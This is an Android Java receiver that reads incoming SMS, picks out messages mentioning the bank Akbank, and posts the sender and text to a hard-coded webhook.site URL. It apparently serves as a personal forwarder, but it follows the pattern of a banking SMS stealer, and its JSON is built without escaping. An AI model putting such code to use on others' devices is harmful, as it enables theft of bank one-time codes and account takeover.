package com.example.smswebhook;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();

        if (bundle == null) {
            Log.e("SmsReceiver", "Intent bundle is null");
            return;
        }

        Object[] pdus = (Object[]) bundle.get("pdus");

        if (pdus == null) {
            Log.e("SmsReceiver", "PDUs is null");
            return;
        }

        String format = bundle.getString("format");

        for (Object pdu : pdus) {
            SmsMessage sms;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                sms = SmsMessage.createFromPdu((byte[]) pdu);
            }

            if (sms == null) {
                Log.e("SmsReceiver", "SmsMessage is null");
                continue;
            }

            String messageBody = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();

            if (messageBody != null && messageBody.toLowerCase().contains("akbank")) {
                Log.d("SmsReceiver", "Mesajı göndermeye başlıyoruz. Sender: " + sender);
                sendToWebhook(messageBody, sender);
            }
        }
    }

    private void sendToWebhook(String message, String sender) {
        new Thread(() -> {
            try {
                URL url = new URL("https://webhook.site/d45e94d9-42ba-48e1-a81e-7d955d7487a7"); // Webhook URL'nizi buraya yazın.
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String json = "{\"sender\":\"" + sender + "\",\"message\":\"" + message + "\"}";

                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("Webhook", "Yanıt kodu: " + responseCode);

            } catch (Exception e) {
                Log.e("Webhook", "Hata oluştu: ", e);
            }
        }).start();
    }
}
